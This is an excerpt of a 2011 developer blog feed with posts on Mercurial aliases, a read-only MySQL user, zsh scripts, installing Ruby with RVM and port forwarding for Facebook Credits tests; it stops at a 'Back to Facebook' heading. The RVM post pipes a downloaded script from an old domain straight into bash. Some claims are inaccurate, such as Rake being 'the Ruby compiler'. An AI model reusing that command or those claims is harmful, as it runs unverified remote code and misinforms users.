   <title>Working on Wednesday #10 : Mercurial improved</title>
   <link href="http://blog.pixelastic.com/2011/08/17/working-wednesday-10-mercurial-improved/"/>
   <updated>2011-08-17T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/08/17/working-wednesday-10-mercurial-improved</id>
   <content type="html">&lt;p&gt;Today I enjoyed the nice blue sky and moved to the park at the end of my
street to finish reading the Mercurial guide.&lt;/p&gt;

&lt;p&gt;I skipped the last chapters about patches and queues. I know this would be
useful, but I&amp;#39;d rather get back to them when I&amp;#39;ll need them instead of try
them without any real world example.&lt;/p&gt;

&lt;h2&gt;Tweaking Mercurial&lt;/h2&gt;

&lt;p&gt;I updated my &lt;code&gt;.hgrc&lt;/code&gt; to configure it as best as I could.&lt;/p&gt;

&lt;p&gt;I set &lt;code&gt;vimdiff&lt;/code&gt; to handle the conflicted merge. &lt;code&gt;vim&lt;/code&gt; is quite hard to get
(but it is coming easier the more you use it), but it seems so powerful that
I&amp;#39;m willing to spend some time learning it.&lt;/p&gt;

&lt;p&gt;I&amp;#39;ve also added a &lt;code&gt;cm&lt;/code&gt; alias to &lt;code&gt;commit -Am&lt;/code&gt;. This basically is the same as
calling &lt;code&gt;hg addremove; hg commit&lt;/code&gt; which I happen to do all the time before.&lt;/p&gt;

&lt;p&gt;I&amp;#39;ve create two simple styles and matching templates for my new two aliases
&lt;code&gt;peek&lt;/code&gt; and &lt;code&gt;hist&lt;/code&gt; that repectively display a peek at the last 4 commits, and
display the latest 10 commits in history in a concise way. I still have to
manage to find how I could add coloring to those.&lt;/p&gt;

&lt;p&gt;I&amp;#39;ve also added a &lt;code&gt;discardlocal&lt;/code&gt; alias to remove all local commit and get the
repo back as it is on the remote repo. I never actually had to use it, but I
found the code on Stack Overflow and thought I might need it later.&lt;/p&gt;

&lt;p&gt;I finally wrote a custom &lt;code&gt;resurect&lt;/code&gt; method. It will bring back a deleted file
(obviously, the file needs to be tracked by hg). I simply find the changeset
that deleted the file, and then revert the file to the parent changeset of
that changeset. I might post the exact code later as I&amp;#39;m quite happy with the
result.&lt;/p&gt;

&lt;h2&gt;A note on laptop screens&lt;/h2&gt;

&lt;p&gt;Also, I&amp;#39;ve spent the last few weeks working on my netbook when at home. This
is very tiny thing, the screen is really small (compared to my two 21&amp;quot; at work
for example). But (and I was the first surprised of it), you actually get
accustomed to it after a while.&lt;/p&gt;

&lt;p&gt;Now that I&amp;#39;m writing this post on my 13&amp;quot; other laptop, I feel like it&amp;#39;s huge.
The more I use the netbook, the more I like it. I didn&amp;#39;t quite use it back
when it was running Windows because it was way too slow. Now with Ubuntu on
it, it&amp;#39;s a whole new story !&lt;/p&gt;

&lt;h2&gt;Next week&lt;/h2&gt;

&lt;p&gt;I still have some zsh to learn. I still don&amp;#39;t quite get the quote and double
quote differences, and a few other quirks (arithmetic, arrays, etc).&lt;/p&gt;

&lt;p&gt;I&amp;#39;ve kinda dropped the Rails tutorial. I liked it. Really, I liked it a lot.
But I&amp;#39;m not sure I want to start again learning a framework for making
websites. I&amp;#39;ve made a living doing websites for clients, I still do partly
that today, and I&amp;#39;d like to change.&lt;/p&gt;

&lt;p&gt;I have a lot of personnal project on my mind that I&amp;#39;d like to achieve. Almost
all of them could be achieved using the traditional way of making websites
that both cake and Rails would allow. But one of them might need another way
to look at things. And for this one, I might better need node.&lt;/p&gt;

&lt;p&gt;So.. maybe I&amp;#39;ll start learning node next week. This is actually something I&amp;#39;d
love to do, so this might happen. I&amp;#39;m currently refactoring the JS code of my
work app in Backbone at the moment, so I guess there&amp;#39;s no perfect time for
some JS practice.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Working on Wednesday #9 : Mercurial</title>
   <link href="http://blog.pixelastic.com/2011/08/11/working-wednesday-9-mercurial/"/>
   <updated>2011-08-11T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/08/11/working-wednesday-9-mercurial</id>
   <content type="html">&lt;p&gt;&lt;em&gt;I&amp;#39;m feeling like I&amp;#39;m getting more and more behind schedule for what I
intended to do at first. I still haven&amp;#39;t tried Rails more than that and have
gone on different learning side projects.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;_I&amp;#39;ve been reading the _&lt;a href=&quot;http://hgbook.red-%0Abean.com/read/&quot;&gt;Mercurial : Definite Guide&lt;/a&gt; the past few days to get a correct grasp of the soft.&lt;/p&gt;

&lt;p&gt;I&amp;#39;ve been using Mercurial for the pas two years, but through a GUI and without
using any &amp;quot;advanced&amp;quot; features. I never branched a project, and always worked
alone.&lt;/p&gt;

&lt;h2&gt;Commands&lt;/h2&gt;

&lt;p&gt;Now that I&amp;#39;m working on a Linux machine every day, I can use hg through the
command line.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;hg commit -Am &amp;quot;commit message&amp;quot;&lt;/code&gt; is the same as &lt;code&gt;hg addremove; hg commit -m
&amp;quot;commit message&amp;quot;.&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;hg rollback&lt;/code&gt; will remove the last local commit. Useful if you forgot files in
the commit, or if you inserted a typo in your commit message&lt;/p&gt;

&lt;p&gt;&lt;code&gt;hg revert&lt;/code&gt; can revert a file or set of files to the state they were at the
last commit. This can also cancel a &lt;code&gt;hg add&lt;/code&gt; or &lt;code&gt;hg remove&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;hg backout&lt;/code&gt; can &amp;quot;forget&amp;quot; a commit in the history. It will not really forget
the commit (ie. will not let you alter the history). Instead, it will create a
new commit where the specified changeset is removed (through a merge). It can
easily backout the tip, but may involve more merge work if we want to backout
an old changeset.&lt;/p&gt;

&lt;h2&gt;Automation&lt;/h2&gt;

&lt;p&gt;Also, I&amp;#39;ve learned about two great tools of Mercurial.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;hg bisect&lt;/code&gt; let you isolate a specified commit in your history where you
introduced a specific bug. You write a piece of code that, given a changeset,
returnsÂ &lt;code&gt;true&lt;/code&gt; or &lt;code&gt;false&lt;/code&gt; based on the bug presence, and &lt;code&gt;hg bisect&lt;/code&gt; will
cleverly scan the history to find the revision that introduced the bug.&lt;/p&gt;

&lt;p&gt;hooks where also very interesting. One can script automatic command on
specific hg command like &lt;code&gt;commit&lt;/code&gt;, &lt;code&gt;pull&lt;/code&gt;, &lt;code&gt;push&lt;/code&gt;. Or even before those
commande to refuse the command if something does not work as expected.&lt;/p&gt;

&lt;p&gt;The classical examples where running a build process after a commit, refusing
a commit if no bug id where specified, or if the tests didn&amp;#39;t pass. Another
use case would be to push changes to a remote server on commit.&lt;/p&gt;

&lt;h2&gt;Git&lt;/h2&gt;

&lt;p&gt;Why am I learning Mercurial while all the cool guys are using git ?&lt;/p&gt;

&lt;p&gt;Well, I&amp;#39;ve read a lot of papers comparing hg to git. What I&amp;#39;ve read the more
is that git is an awesome toolbox that lets you do whatever you want with your
version control, through its 100+ tools.&lt;/p&gt;

&lt;p&gt;On the other hand, Mercurial is far easier to learn and has built-in command
for the day to day work. As I was already quite familiar with Mercurial, I
stick with it, but know that I&amp;#39;ll learn git also eventually.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Creating a readonly mysql user</title>
   <link href="http://blog.pixelastic.com/2011/08/05/creating-readonly-mysql-user/"/>
   <updated>2011-08-05T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/08/05/creating-readonly-mysql-user</id>
   <content type="html">&lt;p&gt;I wanted to give access to a database to a colleague, so he can connect and
extract some useful stats from our database.&lt;/p&gt;

&lt;p&gt;As I didn&amp;#39;t want to give him nor the root, nor my access nor even an access
with writing permission to avoid potential issues, I created a readonly user.&lt;/p&gt;

&lt;p&gt;First, connect to the mysql server :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;mysql --user&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;root -p
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And type your password when asked&lt;/p&gt;

&lt;p&gt;Now that you are in the mysql prompt, create the &amp;#39;readonly&amp;#39; user and give him
&lt;code&gt;SELECT&lt;/code&gt;permission on all tables&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;CREATE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;USER&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;readonly&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;%&amp;#39;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IDENTIFIED&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;BY&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;your_password&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;GRANT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ON&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;TO&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;readonly&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;%&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Also note that once connected with root, you can see the list of users by
running :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pass&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Nothing fancy here, everything was found after a few minutes of googling.&lt;/p&gt;

&lt;p&gt;Also, if you ever need to delete the user :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;DROP&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;USER&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;readonly&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;%&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
 </entry>
 
 <entry>
   <title>Working on Wednesday #8 : Custom zsh scripts for housekeeping</title>
   <link href="http://blog.pixelastic.com/2011/08/03/working-wednesday-8-custom-zsh-scripts-housekeeping/"/>
   <updated>2011-08-03T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/08/03/working-wednesday-8-custom-zsh-scripts-housekeeping</id>
   <content type="html">&lt;p&gt;I made a break of the Ruby/Rails learning this week. Instead I learned a bit
more about the basic Linux command, and made a few scripts to help me in my
day to day work (and fun) with my Linux environment.&lt;/p&gt;

&lt;p&gt;I currently use two laptops. One is a tiny netbook while the other a Dell XPS.
I mostly use the XPS for everything work related (like posting this), while
the netbook is dedicated to casual use : browsing, playing, etc.&lt;/p&gt;

&lt;p&gt;Last week, during my vacations, I only took the netbook with me, and while not
strictly speaking working on it I still had to code a little bit. I installed
&lt;code&gt;ScummVM&lt;/code&gt;, &lt;code&gt;CortixTH&lt;/code&gt; and managed to run Carmageddon 2 under &lt;code&gt;wine&lt;/code&gt;. I also
downloaded and tried a few old emulator games on my
&lt;a href=&quot;http://en.wikipedia.org/wiki/Dingoo_A320&quot;&gt;Dingoo&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;As you may have guessed, I wrote a bunch of scripts during that week to help
me in some of the more tedious aspects of this task.&lt;/p&gt;

&lt;h2&gt;Dingoo deployment&lt;/h2&gt;

&lt;p&gt;Downloading roms, copying them to the Dingoo, and then testing the games to
make sure they are working was tedious. I wrote a little script that
automatically mount the Dingoo when plugged to the computer, and copy my games
to it, removing old version along the way while still keeping my saved games.&lt;/p&gt;

&lt;p&gt;I had to parse &lt;code&gt;dmesg&lt;/code&gt; (thanks to &lt;code&gt;grep&lt;/code&gt;, &lt;code&gt;tail&lt;/code&gt; and &lt;code&gt;sed&lt;/code&gt;) as well as use
&lt;code&gt;rsync&lt;/code&gt; for the copy.&lt;/p&gt;

&lt;h2&gt;Sansa Clip cleaning&lt;/h2&gt;

&lt;p&gt;I also wrote a simple script to clean my &lt;a href=&quot;http://anythingbutipod.com/2009/08/sandisk-sansa-clip-plus-review/&quot;&gt;Sansa
Clip&lt;/a&gt; of
all the useless files I had put on it. As I only have a text screen, I don&amp;#39;t
need the &lt;code&gt;jpg&lt;/code&gt; covers, torrent &lt;code&gt;txt&lt;/code&gt; files, auto-generated &lt;code&gt;m3u&lt;/code&gt; files and
other &lt;code&gt;thumbs.db&lt;/code&gt; and &lt;code&gt;.DS_Store&lt;/code&gt; useless files.&lt;/p&gt;

&lt;p&gt;Here, &lt;code&gt;find&lt;/code&gt; to the rescue with some &lt;code&gt;zsh&lt;/code&gt; scripting, and here we go.&lt;/p&gt;

&lt;h2&gt;Shared config files&lt;/h2&gt;

&lt;p&gt;As I&amp;#39;m working on several computers (two laptops and the one at work at
least), I found myself spending time reconfiguring stuff multiple times.&lt;/p&gt;

&lt;p&gt;Here, thanks to Dropbox and some clever &lt;code&gt;ln -s&lt;/code&gt; calls, I managed to replicate
the same config on the 3 machines easily.&lt;/p&gt;

&lt;p&gt;From my freelance time, I also have a pretty big &lt;code&gt;/etc/hosts&lt;/code&gt; and
&lt;code&gt;~/.ssh/config&lt;/code&gt; file. At work, I have another one for the work servers. But I
sometimes had to connect to the work server from home.&lt;/p&gt;

&lt;p&gt;So once again, thanks to Dropbox, some &lt;code&gt;ln -s&lt;/code&gt; once more and &lt;code&gt;cat&lt;/code&gt; I wrote two
functions to regenerate those two files based on config files. That way,
whenever I change one of those files, it is updated on the other machines too.&lt;/p&gt;

&lt;p&gt;That was it. It took most of my day.&lt;/p&gt;

&lt;p&gt;Being able to script those little repetitive tedious task is something I
really appreciate on Linux. I am no longer dependent on the UI my OS gave me,
and can now really understand how things work. It requires some time to learn,
but this is not going to drastically change from one version to another like
it does on each Windows new release.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Working on Wednesday #6-#7 : Correctly installing Ruby on Rails</title>
   <link href="http://blog.pixelastic.com/2011/07/20/working-wednesday-6-7-correctly-installing-ruby-rails/"/>
   <updated>2011-07-20T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/07/20/working-wednesday-6-7-correctly-installing-ruby-rails</id>
   <content type="html">&lt;p&gt;&lt;em&gt;This post spans two weeks because I couldn&amp;#39;t manage to have a clean
Ruby/Rails install on my first try. I read a lot, installed ruby using various
methods, but finally managed to get it to work corretly.&lt;/em&gt;&lt;/p&gt;

&lt;h2&gt;Cleaning up&lt;/h2&gt;

&lt;p&gt;First of all, you have to remove any ruby version you might have already
installed, just to be sure.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;sudo apt-get remove ruby &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sudo apt-get autoremove
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Installing RVM&lt;/h2&gt;

&lt;p&gt;Then, you have to install RVM before installing Ruby. My biggest mistake in my
various shots at installing Ruby was to install RVM last.&lt;/p&gt;

&lt;p&gt;RVM is a very important part of the whole Ruby process. This is a little piece
of genius that allow you to create Ruby sandboxes. You can install various
Ruby versions side by side, even various gem versions and you simply tell RVM
which sandbox you want to use.&lt;/p&gt;

&lt;p&gt;If you are absolutly positive that you will never ever work on more than one
Ruby project in your entire life, you can skip installing RVM and simply
install Ruby globally on your system. But you know that this will never
happen, so, avoid future troubles and install RVM first.&lt;/p&gt;

&lt;p&gt;To install RVM, simply execute the following command&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;bash &amp;lt; &amp;lt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;curl -s https://rvm.beginrescueend.com/install/rvm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This will download and execute the install script. Once it&amp;#39;s finished, edit
your &lt;code&gt;.bashrc&lt;/code&gt; or &lt;code&gt;.zshrc&lt;/code&gt; to include the rvm config file whenever a shell is
launched.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; -r &lt;span class=&quot;nv&quot;&gt;$HOME&lt;/span&gt;/.rvm/scripts/rvm &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$HOME&lt;/span&gt;/.rvm/scripts/rvm
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Just to sure to have the latest version, I also ran&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;rvm get head
rvm reload
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Updating your system&lt;/h2&gt;

&lt;p&gt;RVM depends on some binaries to work, so be sure to install them all. They are
listed when running &lt;code&gt;rvm notes&lt;/code&gt;, but as the time of writing this was the list
for me :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;sudo apt-get install build-essential bison openssl libreadline6 libreadline6-dev curl git-core zlib1g zlib1g-dev libssl-dev libyaml-dev libsqlite3-0 libsqlite3-dev sqlite3 libxml2-dev libxslt-dev autoconf libc6-dev ncurses-dev
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Installing Ruby&lt;/h2&gt;

&lt;p&gt;Once RVM is installed, installing the latest (1.9.2 as the time of writing)
Ruby version is as easy as :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;rvm install 1.9.2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This will take some time, downloading and compiling Ruby. Next, tell RVM that
this is the version we are gonna use.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;rvm use 1.9.2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You can always switch back to your system-wide ruby install by doing&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;rvm use system
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Creating a gemset&lt;/h2&gt;

&lt;p&gt;Plugins in Ruby world are named gems. They can easily be installed/uninstalled
to a project to provide advanced features. Rails itself is a gem.&lt;/p&gt;

&lt;p&gt;The traditional way of using gem is to simpy using the RubyGem command &lt;code&gt;gem.&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;When using RVM and its sandboxed mode however, the best way is to create a
gemset, and install gems in that gemset. This will allow us in the future to
switch between multiple gemset easily.&lt;/p&gt;

&lt;p&gt;I suggest creating a gemset for each project you start. You can also install
gems in the global gemset so they get available to each project. As I&amp;#39;m new to
the Ruby world and still don&amp;#39;t really know which gems ar &amp;quot;must-have&amp;quot;, I&amp;#39;ll
skip this part for now.&lt;/p&gt;

&lt;p&gt;Let&amp;#39;s create a new gemset for our new project. I&amp;#39;ll name mine &lt;code&gt;pixelastic&lt;/code&gt;,
but change the name to fit your project name&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;rvm gemset create pixelastic
rvm gemset use pixelasticÂ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You&amp;#39;ll be now using the gemset &lt;code&gt;pixelastic&lt;/code&gt;. You can list all available gems
in your current gemset by doing&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;gem list
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Or list all the available gemsets by doing :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;rvm gemset list
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The one you are currently using will be prefixed by &lt;code&gt;=&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;h2&gt;What is Rake ?&lt;/h2&gt;

&lt;p&gt;You might have noticed that your new gemset contains only one gem, named Rake.
You do not need too spend to much time on that. You simply have to know that
Rake is more or less the Ruby compiler. Your Ruby code will go through this
gem to became a running app.&lt;/p&gt;

&lt;h2&gt;Installing Rails&lt;/h2&gt;

&lt;p&gt;As I said above, Rails is a gem like many other, so you can simply install it
by doing :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;gem install rails
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Note that because we are using RVM, the gem will only be installed in this
gemset and not globally. If you switch gemset, rails will no longer be
available.&lt;/p&gt;

&lt;p&gt;If we weren&amp;#39;t using RVM, the gem would have been installed globally. RVM is
actually wrapping itself around the &lt;code&gt;gem&lt;/code&gt; command to sandbox it inside its own
gemset.&lt;/p&gt;

&lt;h2&gt;Handling dependencies with Bundler&lt;/h2&gt;

&lt;p&gt;Installing Rails will install a bunch of other gems. One of them is Bundler.&lt;/p&gt;

&lt;p&gt;Bundler is a Rails specific gem dependencies handler. Its features seems to
overlap thoses of RVM. At the time of writing, I haven&amp;#39;t yet used it, but its
main use still seems to be its gemfile.&lt;/p&gt;

&lt;p&gt;The goal of a gemfile (located in your project directory) is to list all the
gems your project will need (along with respective versions if provided).
Then, whenever you drop your project in a new environment, Bundler will be
able to download and install your gems for you.&lt;/p&gt;

&lt;p&gt;If said environment uses RVM, then the gems will be saved in the gemset, if
not they will be installed globally. Bundler is absolutly not linked to RVM
and can be used independently.&lt;/p&gt;

&lt;p&gt;The syntax of a gem file will not be discussed here as I have no previous
experience with them, but the command to read the gemfile and update the
project accordingly is :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;bundle install
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Automatic switching gemset&lt;/h2&gt;

&lt;p&gt;One nice bit of RVM is that it is able to automatically detect the gemset to
use on a per project basis. You simply have to create a .rvmrc file in a
project, and RVM will execute it.&lt;/p&gt;

&lt;p&gt;For example, to use my &lt;code&gt;pixelastic&lt;/code&gt; gemset and Ruby 1.9.2, simply add the
following to your &lt;code&gt;.rvmrc&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;rvm use 1.9.2@pixelastic
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;References&lt;/h2&gt;

&lt;p&gt;I read a lot on the subject, to finally get it right. Here are the various
sources :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://marcgrabanski.com/articles/gem-management-with-rvm-and-bundler&quot;&gt;Mark Grabanski&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.railway.at/2010/02/13/avoiding-rails-3-dependency-hell-with-rvm/&quot;&gt;Railway.at&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://guides.rubyonrails.org/getting_started.html&quot;&gt;The official Get Started guide&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://stackoverflow.com/questions/4604064/ruby-gems-bundler-and-rvm-confusion&quot;&gt;A Stack Overflow question about RVM, Gems and Bundler&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;Update : Sqlite3&lt;/h2&gt;

&lt;p&gt;If you got error complaining about Sqlite3 missing, just&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;sudo apt-get install libsqlite3-0 libsqlite3-dev
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
 </entry>
 
 <entry>
   <title>Testing Facebook Credits in a local environment</title>
   <link href="http://blog.pixelastic.com/2011/07/15/testing-facebook-credits-local-environment/"/>
   <updated>2011-07-15T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/07/15/testing-facebook-credits-local-environment</id>
   <content type="html">&lt;p&gt;Testing Facebook API has always been a pain for me. Their documentation is
still crappy and examples are wrong or/and outdated. Things don&amp;#39;t exactly work
the same way when you&amp;#39;re testing with &amp;quot;Test account&amp;quot; or real accounts.&lt;/p&gt;

&lt;p&gt;One of the things that helped me much was to create a test application and set
its canvas url to a local server. As the iframe call is done through the
client, I can test local code without the need to upload stuff to an online
server.&lt;/p&gt;

&lt;p&gt;I could even test Requests and Streams through this method as it&amp;#39;s the
Javascript SDK that does all the AJAX calls. The only tiny issue was with
Stream images as Facebook requests them server-side before displaying them, I
had to put some placeholder images online.&lt;/p&gt;

&lt;p&gt;But today, with the testing of the new Facebook Credits API, new horizon of
pains arised. Facebook will make no less than three calls to one of my server
callback url, but does not make them client-side.&lt;/p&gt;

&lt;p&gt;I still don&amp;#39;t want to upload my code to a debug server just to test this
feature, so I decided to put in place a little IP/port forwarding. Thanks to
tips from my colleague &lt;a href=&quot;http://leo-peltier.fr/&quot;&gt;LÄÅ o&lt;/a&gt;, this was done in a
matter of minutes.&lt;/p&gt;

&lt;h2&gt;Setting up the DNS/port forwarding&lt;/h2&gt;

&lt;p&gt;First, we&amp;#39;ll need a url that Facebook will call. I want this url to point to
my local server. So all I had to do was to create a simple DNS redirect at
dyndns.com that point to my local IP.&lt;/p&gt;

&lt;p&gt;Let it be http://customname.dyndns-office.com/&lt;/p&gt;

&lt;p&gt;Paste this url in the &amp;quot;callback url&amp;quot; field of your Facebook Credits config
page.&lt;/p&gt;

&lt;p&gt;Then, I&amp;#39;ll assign a fixed internal IP to my computer so that it won&amp;#39;t change
on each reboot. My router can do that just fine, by assigning a fixed internal
IP based on the MAC adress.&lt;/p&gt;

&lt;p&gt;Let it be 192.168.0.51&lt;/p&gt;

&lt;p&gt;Now, we&amp;#39;ll redirect every call on the router through port 80 (http) to that
url. My router admin panel can also do that just fine, in its DHCP
configuration.&lt;/p&gt;

&lt;p&gt;Finally, we&amp;#39;ll have to update the server virtualhost config to point all
incoming requests matching &lt;code&gt;customname.dyndns-office.com&lt;/code&gt; to the server files.&lt;/p&gt;

&lt;h2&gt;A side note&lt;/h2&gt;

&lt;p&gt;There is one last little gotcha to be aware of.&lt;/p&gt;

&lt;p&gt;It does not seem to be possible to access one of your network computer from an
external IP (as we just configured) FROM one of your network computer.&lt;/p&gt;

&lt;p&gt;In other words, if you would like to test your config, do not type
&lt;code&gt;http://customname.dyndns-office.com/&lt;/code&gt; in your browser on one of the computers
sharing the same network as 192.168.0.51.&lt;/p&gt;

&lt;p&gt;Instead, use a free wifi connection, a ssh tunnel or curl from an external
server you own.&lt;/p&gt;

&lt;p&gt;In my case, locally testing &lt;code&gt;http://customname.dyndns-office.com/&lt;/code&gt; always
brought me to my router admin panel and did not forward the port correctly.
Doing a &lt;code&gt;curl http://customname.dyndns-office.com/&lt;/code&gt; from one of my online
servers correctly returned what I wanted.&lt;/p&gt;

&lt;h2&gt;Back to Facebook&lt;/h2&gt;
